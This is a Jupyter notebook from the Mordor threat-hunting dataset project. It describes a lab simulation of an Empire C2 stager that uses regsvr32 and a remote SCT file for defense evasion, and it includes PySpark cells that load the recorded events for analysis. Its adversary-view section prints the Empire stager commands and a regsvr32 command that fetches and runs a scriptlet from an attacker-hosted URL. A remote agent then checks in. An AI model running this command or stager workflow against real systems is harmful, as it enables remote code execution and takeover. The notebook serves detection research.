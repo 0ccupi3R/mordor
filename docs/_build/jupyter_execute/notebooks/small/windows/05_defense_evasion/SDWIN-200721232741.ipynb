{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Launcher SCT Regsvr32"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SDWIN-200721232741 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 2020/07/21 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| Mordor shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script | https://github.com/BC-SECURITY/Empire/blob/master/lib/stagers/windows/launcher_sct.py |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/defense_evasion/empire_launcher_sct_regsvr32.zip |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents threat actors leveraging regsvr32 to proxy the execution of an empire payload (.sct file) to create a reverse connection to the C2."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "Threat Actor View:\n",
    "(Empire) > usestager windows/launcher_sct\n",
    "(Empire: stager/windows/launcher_sct) > info\n",
    "\n",
    "Name: regsvr32\n",
    "\n",
    "Description:\n",
    "  Generates an sct file (COM Scriptlet) Host this\n",
    "  anywhere\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name             Required    Value             Description\n",
    "  ----             --------    -------           -----------\n",
    "  Listener         True                          Listener to generate stager for.\n",
    "  Language         True        powershell        Language of the stager to generate.\n",
    "  StagerRetries    False       0                 Times for the stager to retry\n",
    "                                                connecting.\n",
    "  Base64           True        True              Switch. Base64 encode the output.\n",
    "  Obfuscate        False       False             Switch. Obfuscate the launcher\n",
    "                                                powershell code, uses the\n",
    "                                                ObfuscateCommand for obfuscation types.\n",
    "                                                For powershell only.\n",
    "  ObfuscateCommand False       Token\\All\\1       The Invoke-Obfuscation command to use.\n",
    "                                                Only used if Obfuscate switch is True.\n",
    "                                                For powershell only.\n",
    "  OutFile          False       /tmp/launcher.sct File to output SCT to, otherwise\n",
    "                                                displayed on the screen.\n",
    "  UserAgent        False       default           User-agent string to use for the staging\n",
    "                                                request (default, none, or other).\n",
    "  Proxy            False       default           Proxy to use for request (default, none,\n",
    "                                                or other).\n",
    "  ProxyCreds       False       default           Proxy credentials\n",
    "                                                ([domain\\]username:password) to use for\n",
    "                                                request (default, none, or other).\n",
    "\n",
    "\n",
    "(Empire: stager/windows/launcher_sct) > set Listener http\n",
    "(Empire: stager/windows/launcher_sct) > execute\n",
    "\n",
    "[*] Stager output written out to: /tmp/launcher.sct\n",
    "\n",
    "Victim's PC\n",
    "\n",
    "PS C:\\Windows\\System32> .\\regsvr32.exe /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll\n",
    "\n",
    "Threat Actor View:\n",
    "\n",
    "(Empire: stager/windows/launcher_sct) > back\n",
    "(Empire) > \n",
    "Empire: agents) > \n",
    "[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n",
    "[*] New agent 712ETU3B checked in\n",
    "[+] Initial agent 712ETU3B from 172.18.39.5 now active (Slack)\n",
    "[*] Sending agent (stage 2) to 712ETU3B at 172.18.39.5\n",
    "\n",
    "(Empire: agents) > \n",
    "(Empire: agents) > \n",
    "(Empire: agents) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "712ETU3B ps 172.18.39.5     WORKSTATION5      *MORDOR\\pgustavo        powershell         9076   5/0.0    2020-07-22 03:29:27  http            \n",
    "\n",
    "(Empire: agents) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/defense_evasion/empire_launcher_sct_regsvr32.zip\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT *\n",
    "FROM mordorTable\n",
    "    '''\n",
    ")\n",
    "df.printSchema()\n",
    "        "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "PySpark_Python3",
   "language": "python",
   "name": "pyspark3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}